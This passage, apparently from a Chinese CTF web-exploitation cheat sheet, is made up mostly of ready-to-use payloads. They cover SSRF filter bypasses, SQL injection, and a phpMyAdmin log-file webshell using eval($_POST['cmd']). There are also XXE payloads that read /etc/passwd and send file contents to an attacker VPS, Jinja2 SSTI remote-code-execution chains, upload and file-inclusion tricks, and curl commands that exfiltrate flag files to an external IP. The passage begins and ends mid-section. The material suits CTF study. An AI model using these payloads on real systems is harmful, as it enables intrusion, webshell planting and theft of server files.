title="过滤指定字符串"></a>过滤指定字符串</h2><p>用unicode编码绕过localhost的限制</p><pre><code>LocalHost = localhost = ⓛocaⓛhost </code></pre><h2 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h2><h3 id="host白名单"><a href="#host白名单" class="headerlink" title="host白名单"></a>host白名单</h3><p>检测host是不是含有白名单如<code>baidu.com</code>，可以用两种方法：</p><p>1、data://协议，php不关心MIME类型，所以可以把baidu.com放到MIME类型里</p><pre><code>data://baidu.com/plain;base64,xxxxxx</code></pre><p>xxx是我们想让服务器解析的明文字符串，以base64的方式编码</p><p>2、orange的思路</p><pre><code>http://foo@127.0.0.1:80@baidu.com/flag.php</code></pre><p>curl请求的是127.0.0.1，而baidu.com是题目的白名单</p><h3 id="指定后缀名绕过-仅限于curl产生的ssrf"><a href="#指定后缀名绕过-仅限于curl产生的ssrf" class="headerlink" title="指定后缀名绕过(仅限于curl产生的ssrf)"></a>指定后缀名绕过(仅限于curl产生的ssrf)</h3><p>例如下面这种情况，指定必须为jpg后缀时，可以用<code>file:///flag.php?.jpg</code>也可以读到<code>/flag.php</code>文件，详情见文章:<a href="https://xz.aliyun.com/t/7112" target="_blank" rel="noopener">浅析SSRF与文件读取的一些小特性</a></p><pre><code>&lt;?phpvar_dump(ini_get(&#39;allow_url_fopen&#39;));$url = $_POST[&#39;url&#39;];$url = $url . &#39;.jpg&#39;;var_dump($url);if(function_exists(&#39;curl_init&#39;) &amp;&amp; function_exists(&#39;curl_exec&#39;)){    $ch = curl_init($url);    $data = &#39;&#39;;    curl_setopt($ch, CURLOPT_HEADER, 0);    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    $data = curl_exec($ch);    curl_close($ch);    var_dump($data);}?&gt;</code></pre><h2 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h2><h3 id="常规的思路"><a href="#常规的思路" class="headerlink" title="常规的思路"></a>常规的思路</h3><p>数字地址(十进制)：127.0.0.1-&gt;2130706433<br>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1-&gt;127.1</p><p>或者利用xio.io</p><pre><code>127.0.0.1.xip.iowww.127.0.0.1.xip.ioxxx.127.0.0.1.xip.iofuzz.xxx.127.0.0.1.xip.io</code></pre><h3 id="骚姿势"><a href="#骚姿势" class="headerlink" title="骚姿势"></a>骚姿势</h3><p>之前在吐司学的一招实战用：如果302跳转(准确的说是http协议)禁用IPV4的规则传入，可以用IPV6绕过：</p><pre><code>http://[::ffff:127.0.0.1]/也可以缩写成 http://[::1]/</code></pre><h2 id="check内网ip段绕过"><a href="#check内网ip段绕过" class="headerlink" title="check内网ip段绕过"></a>check内网ip段绕过</h2><p>php过滤代码如下</p><pre><code>    $hostname=$url_parse[&#39;host&#39;];     $ip=gethostbyname($hostname);     $int_ip=ip2long($ip);    return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; </code></pre><p>用ip2long和parse_url来check请求是否包含内网ip段，则可以用以下方法绕过</p><pre><code>1. http://0.0.0.0/flag.php2. http://foo@127.0.0.1:80@baidu.com/flag.php3. http://%5B::%5D:22/</code></pre><p>第一种是对于0.0.0.0掩码绕过<br>第二种白名单是baidu.com，黑名单是127x网段<br>第三种是绕过主机名探测，用[::]替代127.0.0.1</p><h2 id="file协议妙用"><a href="#file协议妙用" class="headerlink" title="file协议妙用"></a>file协议妙用</h2><p>我们可以通过 file:///proc/self/cwd/index.php 获得index.php文件。在linux中，每个进程都有一个PID，而/proc/xxx/下存放着与该进程相关的信息（这里的xxx就是PID）。/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录，例如我本机Apache的根目录是/var/www/html</p><p><img src="http://static.zybuluo.com/1160307775/osyc4y4bkxtkyuy286wrpuh0/image_1ddqj7884117n43j19vu1rgn347p.png" alt="image_1ddqj7884117n43j19vu1rgn347p.png-54.3kB"></p><h3 id="arp表"><a href="#arp表" class="headerlink" title="arp表"></a>arp表</h3><p><code>proc/net/arp</code></p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p>sql语句查询mysql操作日志:<a href="http://www.cnblogs.com/jhin-wxy/p/8965888.html" target="_blank" rel="noopener">http://www.cnblogs.com/jhin-wxy/p/8965888.html</a></p><p>mysql5.7文档:<a href="https://dev.mysql.com/doc/" target="_blank" rel="noopener">https://dev.mysql.com/doc/</a></p><h2 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h2><ul><li>查询所有的数据库:<pre><code>select group_concat(schema_name) from  information_schema.schemata</code></pre></li><li>查询数据表:<pre><code>select group_concat(table_name) from  information_schema.tables where table_schema = database()</code></pre></li><li>查询字段:<pre><code>select group_concat(column_name) from  information_schema.columns where table_name = &#39;user&#39;</code></pre></li></ul><h2 id="盲注语句"><a href="#盲注语句" class="headerlink" title="盲注语句"></a>盲注语句</h2><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>可以用python3的模块string打印所有字母和符号</p><pre><code>import stringfor c in string.printable</code></pre><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><pre><code>and ascii(substr(database(),1,1))&gt;?</code></pre><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>五种造成延时的方法:<a href="https://www.smi1e.top/sql%e6%b3%a8%e5%85%a5%e7%ac%94%e8%ae%b0/[https://www.cdxy.me/?p=789](https://www.cdxy.me/?p=789)" target="_blank" rel="noopener">MySQL时间盲注五种延时方法</a></p><p>推荐sleep、benchmark</p><p><img src="http://static.zybuluo.com/1160307775/ggkko75qnyhcasecsp27sqmz/image_1dgk48rf11ka11ehqo7b6hl8eu19.png" alt="image_1dgk48rf11ka11ehqo7b6hl8eu19.png-33kB"></p><p>配合if使用效果极佳</p><pre><code>if(expr1,expr2,sleep(10))</code></pre><p>如果 expr1 为真，则if函数执行expr2语句; 否则执行sleep语句。</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>updatexml()这个报错函数真的太强了，首先你要了解<a href="http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html" target="_blank" rel="noopener">Xpath</a>。在Mysql中使用了一下这个函数，发现当XPath 使用路径表达式不符合规范时，就会报错，而报错的内容就非常神奇了。下面贴一张报错内容和语法：</p><pre><code>or updatexml(1,concat(0x7e,database()),1)</code></pre><p>报错注入的姿势有很多，po一个写了十种报错函数的<a href="http://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">帖子</a></p><h2 id="堆叠注入-经典union被过滤"><a href="#堆叠注入-经典union被过滤" class="headerlink" title="堆叠注入(经典union被过滤)"></a>堆叠注入(经典union被过滤)</h2><p>PHP中如果使用PDO的连接形式则可能产生堆叠注入</p><pre><code>$con = &quot;mysql:host=localhost;port=3306;dbname=acg&quot;;$conn = new PDO($con, &#39;root&#39;, &#39;nihao123&#39;);</code></pre><h3 id="不用select查询字段值"><a href="#不用select查询字段值" class="headerlink" title="不用select查询字段值"></a>不用select查询字段值</h3><p>前提条件是允许执行多条sql语句(即multi模式)</p><h4 id="mysql的预查询"><a href="#mysql的预查询" class="headerlink" title="mysql的预查询"></a>mysql的预查询</h4><p>用SET方法设置一个全局变量值为”select xxx from xx”,再用预编译执行这个全局变量</p><pre><code>SET+@hpdoger=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),char(96),1919810931114514,char(96));prepare+hpdoger+from+@hpdoger;execute+hpdoger;#SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;</code></pre><p>此时全局变量@hpdoger的值就是</p><pre><code>select flag from xxxx;</code></pre><p><img src="http://static.zybuluo.com/1160307775/cmk9b5q0q1qazpnmyyv55oq0/image_1ds4s6841ke71dm0ord1e8t14uf9.png" alt="image_1ds4s6841ke71dm0ord1e8t14uf9.png-60.2kB"></p><p>后面用预编译执行全局变量是因为：想要执行全局变量的前提是有Select语句，但是预编译就不需要，即我们可以用<code>EXECUTE</code>来执行</p><h4 id="使用handler"><a href="#使用handler" class="headerlink" title="使用handler"></a>使用handler</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p><h3 id="当set被过滤"><a href="#当set被过滤" class="headerlink" title="当set被过滤"></a>当set被过滤</h3><p>上面提到的是用<code>SET @hpdoger</code>来设置变量，如果select没被过滤的话，还可以用<code>select @hpdoger:=0x巴拉巴拉</code>来设置变量，详情见：<a href="https://blog.csdn.net/JesseYoung/article/details/40779631" target="_blank" rel="noopener">https://blog.csdn.net/JesseYoung/article/details/40779631</a></p><p>所以上面的预处理语句还可以转换成下面的用法:</p><pre><code>select @hpdoger:=0x73656c656374202a2066726f6d2075736572;PREPARE pord FROM @hpdoger;EXECUTE pord;</code></pre><p><img src="http://static.zybuluo.com/1160307775/yb25h693ft4hw84tle8b5zfp/image_1ds4tb8gk1kpe1m1matr9um1bfsm.png" alt="image_1ds4tb8gk1kpe1m1matr9um1bfsm.png-78.1kB"></p><h2 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h2><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="过滤了”in”或者”or”"><a href="#过滤了”in”或者”or”" class="headerlink" title="过滤了”in”或者”or”"></a>过滤了”in”或者”or”</h3><p>查库名可以用一种新的方式，但是会显示所有存在数据的表名</p><pre><code>select table_schema from sys.x$schema_flattened_keys;</code></pre><p>查所有的数据表</p><pre><code>select table_name from sys.schema_table_statistics limit 0,5;</code></pre><p><img src="http://static.zybuluo.com/1160307775/7h75uvzqq9oez5b08huxcf77/image_1du2onu9nvd33131qsq18fftfh9.png" alt="image_1du2onu9nvd33131qsq18fftfh9.png-44.9kB"></p><h2 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h2><h3 id="phpmyadmin日志getshell"><a href="#phpmyadmin日志getshell" class="headerlink" title="phpmyadmin日志getshell"></a>phpmyadmin日志getshell</h3><ol><li>使用url报错爆出绝对路径，再尝试用sql写shell<pre><code>/phpMyAdmin/index.php?lang[]=1</code></pre></li></ol><p>2.查general_log的路径，与是否开启日志记录功能</p><pre><code>SHOW+GLOBAL+VARIABLES+LIKE+&#39;general_log%&#39;</code></pre><ol start="2"><li>接着执行sql语句，木马就是日志文件<pre><code>SET GLOBAL general_log=&#39;on&#39;;SET GLOBAL general_log_file=&#39;C:/phpStudy/www/xxx.php&#39;; # 可自定义SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;;</code></pre></li></ol><h3 id="GETSHELL总结"><a href="#GETSHELL总结" class="headerlink" title="GETSHELL总结"></a>GETSHELL总结</h3><p><a href="https://xz.aliyun.com/t/2460" target="_blank" rel="noopener">https://xz.aliyun.com/t/2460</a></p><h2 id="MYSQL5-7以后的一些特性"><a href="#MYSQL5-7以后的一些特性" class="headerlink" title="MYSQL5.7以后的一些特性"></a>MYSQL5.7以后的一些特性</h2><p>增加了很多报错函数</p><pre><code>ST_LatFromGeoHash()ST_LongFromGeoHash()GTID_SUBSET()GTID_SUBTRACT()ST_PointFromGeoHash()</code></pre><pre><code>mysql&gt; select ST_LatFromGeoHash(version());</code></pre><p>information_schema被过滤掉的话，可以用Innob来绕过</p><h1 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h1><h2 id="外部实体常用poc"><a href="#外部实体常用poc" class="headerlink" title="外部实体常用poc"></a>外部实体常用poc</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt;</code></pre><h2 id="参数实体常用poc"><a href="#参数实体常用poc" class="headerlink" title="参数实体常用poc"></a>参数实体常用poc</h2><p>外部引入参数实体的例子：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;    %name;]&gt;</code></pre><h2 id="参数实体调用的错误示范"><a href="#参数实体调用的错误示范" class="headerlink" title="参数实体调用的错误示范"></a>参数实体调用的错误示范</h2><p>第一种，错误原因：<strong>XML解析器都不会解析同级参数实体的内容</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % files SYSTEM &quot;file:///etc/passwd&quot;&gt;      &lt;!ENTITY % send SYSTEM &quot;http://myip/?a=%files;&quot;&gt;     %send;]&gt;</code></pre><p>第二种虽然不同级，但直接请求也会发生错误。错误原因：<strong>禁止在内部ENTITY中引用参数实体，但是支持在外部声明的dtd中引入，因此我们可以把下面的payload作为外部dtd文件使用</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;      &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip/?%file;&#39;&gt;&quot;&gt;    %start;    %send;]&gt;</code></pre><h2 id="引入外部dtd文件-amp-OOB-读取本地文件"><a href="#引入外部dtd文件-amp-OOB-读取本地文件" class="headerlink" title="引入外部dtd文件&amp;OOB-读取本地文件"></a>引入外部dtd文件&amp;OOB-读取本地文件</h2><p>直接发起的xxe请求如下，或者以xml文件的形式放在vps(前提XXE可以解析这个xml文件)</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt;%send;%test;%back;]&gt;</code></pre><p>vps上的外部DTD声明文件test2.dtd如下，读取文件并发送请求ood到自己的vps：</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;</code></pre><h2 id="引入外部dtd文件-amp-报错回显-读取本地文件"><a href="#引入外部dtd文件-amp-报错回显-读取本地文件" class="headerlink" title="引入外部dtd文件&amp;报错回显-读取本地文件"></a>引入外部dtd文件&amp;报错回显-读取本地文件</h2><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p><p>所以和OOB的构造方式几乎只有url出不同，其他地方一模一样。</p><p><img src="http://static.zybuluo.com/1160307775/o09e0gt16woeslut7mcjthgm/image_1def8qqag1frb1pfu1ghq1lkvbhf9.png" alt="image_1def8qqag1frb1pfu1ghq1lkvbhf9.png-81.8kB"></p><h2 id="无需引入外部dtd文件-三层嵌套文件读取"><a href="#无需引入外部dtd文件-三层嵌套文件读取" class="headerlink" title="无需引入外部dtd文件-三层嵌套文件读取"></a>无需引入外部dtd文件-三层嵌套文件读取</h2><p>W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;      &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip/?%file;&#39;&gt;&quot;&gt;    %start;    %send;]&gt;&lt;message&gt;10&lt;/message&gt;</code></pre><p>但是对于三层嵌套参数实体构造的payload有些XML解析器是无法检测出来的，比如我本次测试的两种组合php7.2 + libxml2 2.9.4版本和php5.4 + libxml2 2.9.1都是可以有效利用的</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ELEMENT message ANY&gt;    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY % para &#39;        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;para2;    &#39;&gt;    %para;]&gt;&lt;message&gt;10&lt;/message&gt;</code></pre><p>这意味着，无需引用外部dtd也可以实现Blind XXE。</p><h2 id="利用本地xxe来bypass协议不回显的情况"><a href="#利用本地xxe来bypass协议不回显的情况" class="headerlink" title="利用本地xxe来bypass协议不回显的情况"></a>利用本地xxe来bypass协议不回显的情况</h2><p><a href="https://xz.aliyun.com/t/5503" target="_blank" rel="noopener">https://xz.aliyun.com/t/5503</a></p><p><a href="https://www.jishuwen.com/d/2EGU" target="_blank" rel="noopener">https://www.jishuwen.com/d/2EGU</a></p><h3 id="dtd-1"><a href="#dtd-1" class="headerlink" title="dtd-1"></a>dtd-1</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;send;    &#39;&gt;     %remote;]&gt;</code></pre><h3 id="javaweb-的本地xxe"><a href="#javaweb-的本地xxe" class="headerlink" title="javaweb 的本地xxe"></a>javaweb 的本地xxe</h3><pre><code>&lt;!DOCTYPE message [    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;    &lt;!ENTITY % expr &#39;aaa)&gt;        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///FILE_TO_READ&quot;&gt;        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;eval;        &amp;#x25;error;        &lt;!ELEMENT aa (bb&#39;&gt;    %local_dtd;]&gt;&lt;message&gt;&lt;/message&gt;</code></pre><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="骚姿势-1"><a href="#骚姿势-1" class="headerlink" title="骚姿势"></a>骚姿势</h2><h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><p>见SSRF-File协议妙用</p><h3 id="dev-文件读写io"><a href="#dev-文件读写io" class="headerlink" title="/dev-文件读写io"></a>/dev-文件读写io</h3><p>当一个文件被打开时，此时/dev/fd下就存在读写的文件描述符，通过<code>include</code>就能把文件读出来。具体见下面的场景</p><pre><code>&lt;?php  $fp = fopen(&quot;/tmp/flag.txt&quot;, &quot;r&quot;);  if($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;GET&#39; &amp;&amp; isset($_GET[&#39;include&#39;]) &amp;&amp; strlen($_GET[&#39;include&#39;]) &lt;= 10) {    include($_GET[&#39;include&#39;]);  }  fclose($fp);  echo highlight_file(__FILE__, true);?&gt;</code></pre><p>解法:<code>include=/dev/fd/11</code>，描述符不一定是11，可能是4-x中的任意数字</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><pre><code>1、改content-type?2、是否存在解析漏洞 .php.xxx3、是否可以上传其它能解析的后缀？4、存在二次渲染漏洞？imagecreatfrompng5、apache2.4是否存在0a换行绕过？6、htaccess、.user.ini是否可以上传？</code></pre><h2 id="妙用-htaccess"><a href="#妙用-htaccess" class="headerlink" title="妙用.htaccess"></a>妙用.htaccess</h2><p>有个.htaccess所有用法合集:<a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet" target="_blank" rel="noopener">PHP htaccess injection cheat sheet</a></p><p>apache中的.htaccess</p><p>将同目录下的jpg解析为php,文件内容如下</p><pre><code>AddType application/x-httpd-php .jpg</code></pre><h2 id="妙用-user-ini"><a href="#妙用-user-ini" class="headerlink" title="妙用.user.ini"></a>妙用.user.ini</h2><p>.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm/fastcgi，我的IIS php5.3以上的全部用的fastcgi/cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。</p><p>当一个文件夹下有php</p><pre><code>php_value auto_prepend_file = f13g.php</code></pre><h2 id="php-写文件"><a href="#php-写文件" class="headerlink" title="php/.写文件"></a>php/.写文件</h2><p>后缀给<code>php/.</code>，在函数操作的时候也可以存为php<br><img src="http://static.zybuluo.com/1160307775/00ryfouierckkzrm1apw6qop/image_1dikffg1ciuv185fg3v17661m9vp.png" alt="image_1dikffg1ciuv185fg3v17661m9vp.png-83.5kB"></p><p>目前测试copy、file_get_contents都可以</p><h1 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h1><h2 id="Python-Jinja2引擎"><a href="#Python-Jinja2引擎" class="headerlink" title="Python-Jinja2引擎"></a>Python-Jinja2引擎</h2><h3 id="SSTI存在-amp-不存在"><a href="#SSTI存在-amp-不存在" class="headerlink" title="SSTI存在&amp;不存在"></a>SSTI存在&amp;不存在</h3><p>后端如果使用<code>request.url</code>，则会把传递的参数编码，而<code>request.args.get</code>依然存在SSTi的问题。</p><h3 id="常见攻击流程"><a href="#常见攻击流程" class="headerlink" title="常见攻击流程"></a>常见攻击流程</h3><p>入门引导:<a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a></p><p>Python模版注入的解题思路就是：通过<code>__class__</code>属性找到基类object，通过<code>__subclasses__()</code>查看object中有哪些类可以利用，一般都是去寻找os类、然后通过<code>__globals__</code>全局来查找所有的方法及变量及参数，通常用到<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类的<code>popen</code>方法。</p><p>调用链大致如下：</p><pre><code>http://127.0.0.1:5000/test?{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen'](''cat+/flag').read()}}</code></pre><h3 id="执行多行Python语句"><a href="#执行多行Python语句" class="headerlink" title="执行多行Python语句"></a>执行多行Python语句</h3><p>具体见P神vulhub的用法:<a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}  {% for b in c.__init__.__globals__.values() %}  {% if b.__class__ == {}.__class__ %}    {% if 'eval' in b.keys() %}      {{ b['eval']('__import__("os").popen("id").read()') }}    {% endif %}  {% endif %}  {% endfor %}{% endif %}{% endfor %}</code></pre><h3 id="寻找可RCE的类"><a href="#寻找可RCE的类" class="headerlink" title="寻找可RCE的类"></a>寻找可RCE的类</h3><pre><code>cnt=0for item in [].__class__.__base__.__subclasses__():    try:        if &#39;os&#39; in item.__init__.__globals__:            print cnt,item        cnt+=1    except:        print &quot;error&quot;,cnt,item        cnt+=1        continue</code></pre><p>第二种</p><pre><code>#!/usr/bin/env python# encoding: utf-8cnt=0for item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():    try:        cnt2=0        for i in item.__init__.__globals__:            if &#39;eval&#39; in item.__init__.__globals__[i]:                print cnt,item,cnt2,i            cnt2+=1        cnt+=1    except:        print &quot;error&quot;,cnt,item        cnt+=1        continue</code></pre><h3 id="过滤bypass"><a href="#过滤bypass" class="headerlink" title="过滤bypass"></a>过滤bypass</h3><p>过滤了下划线可以考虑用动态传参绕过</p><pre><code>name={{request[request.args.param]}}&amp;param=__class__</code></pre><p>过滤中括号可以直接用”.”来代替属性，圆括号代替下标选择</p><pre><code>{{""|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(77)|attr(request.args.ini)|attr(request.args.glo)}}&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;ini=__init__&amp;glo=__globals__</code></pre><p>过滤了双引号或者点号，可以用|来绕过，|是过滤器<br><img src="http://static.zybuluo.com/1160307775/8c4ksg2ynr1y0pix9ydlya9a/image_1dnp4tbpur791ed1agc189d14cp.png" alt="image_1dnp4tbpur791ed1agc189d14cp.png-91.2kB"></p><h2 id="相关链接-1"><a href="#相关链接-1" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://xz.aliyun.com/t/3679#toc-0" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a></p><p>很详细的一篇文章：<a href="https://www.anquanke.com/post/id/188172#h2-0" target="_blank" rel="noopener">SSTI/沙盒逃逸详细总结</a></p><p><a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">从SSTI到沙箱逃逸-jinja2</a></p><p><a href="https://blog.szfszf.top/tech/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8E%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E4%BA%8C/" target="_blank" rel="noopener">Python沙箱逃逸与模板注入SSTI</a></p><p><a href="http://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters" target="_blank" rel="noopener">模板设计者文档</a></p><h1 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><ul><li><p>php://input<br><img src="http://static.zybuluo.com/1160307775/bm2tqiqmypmrpzaszatv1w0t/image_1d83kt9ffd621pod1p0o62e125m.png" alt="image_1d83kt9ffd621pod1p0o62e125m.png-121kB"></p></li><li><p>php://filter</p><pre><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></pre></li><li><p>phar://<br><img src="http://static.zybuluo.com/1160307775/7xr0kz01z7zheao17t65uhdq/image_1d83liset16qc1k5e1bva4j3a7f1t.png" alt="image_1d83liset16qc1k5e1bva4j3a7f1t.png-107.3kB"></p></li></ul><h1 id="命令执行类"><a href="#命令执行类" class="headerlink" title="命令执行类"></a>命令执行类</h1><h2 id="常识-2"><a href="#常识-2" class="headerlink" title="常识"></a>常识</h2><p>获取flag文件并用Curl协议外带到自己的vps</p><pre><code>curl &#39;http://50.16.48.95/&#39; data &quot;`cat+/flag.txt`&quot;</code></pre><pre><code>curl -T ./flag.txt http://50.16.48.95/</code></pre><h2 id="命令执行Bypass"><a href="#命令执行Bypass" class="headerlink" title="命令执行Bypass"></a>命令执行Bypass</h2><h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p><img src="http://static.zybuluo.com/1160307775/s3yk12vptcnavyiki9wxfi51/image_1dpcjfim7tn1jc6eo7vsdr6i9.png" alt="image_1dpcjfim7tn1jc6eo7vsdr6i9.png-92.2kB"></p><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><pre><code>ca\t /f\lag</code></pre><h3 id="双引号-amp-分号–复杂变量"><a href="#双引号-amp-分号–复杂变量" class="headerlink" title="双引号&amp;分号–复杂变量"></a>双引号&amp;分号–复杂变量</h3><p>PHP复杂变量：<a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">https://xz.aliyun.com/t/4785</a></p><pre><code>${system(whoami)}</code></pre><p><img src="http://static.zybuluo.com/1160307775/ze8sakz6ijx1zx262kicbqnj/image_1dcp3bus82rs1ugp15ij1l75121e9.png" alt="image_1dcp3bus82rs1ugp15ij1l75121e9.png-79.6kB"></p><h3 id="单参数过滤-用http头传参绕过"><a href="#单参数过滤-用http头传参绕过" class="headerlink" title="单参数过滤-用http头传参绕过"></a>单参数过滤-用http头传参绕过</h3><p>nginx、apache中都可以用get_defined_vars()，但是apche还可以用getallheaders()</p><pre><code>eval(next(current(get_defined_vars())));&amp;b=var_dump(file_get_contents(&#39;/flag&#39;));</code></pre><p>还可以对session进行操作来绕过检测</p><pre><code>eval(hex2bin(session_id(session_start())));PHPSESSID=7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b</code></pre><h1 id="hash长度拓展"><a href="#hash长度拓展" class="headerlink" title="hash长度拓展"></a>hash长度拓展</h1><p>已知md5($key.xxx)的一个值，还知道$key的长度，就可以构造任意md5($key.xxx)</p><h1 id="Javascript原型链污染"><a href="#Javascript原型链污染" class="headerlink" title="Javascript原型链污染"></a>Javascript原型链污染</h1><h2 id="骚操作-preventExtensions绕过"><a 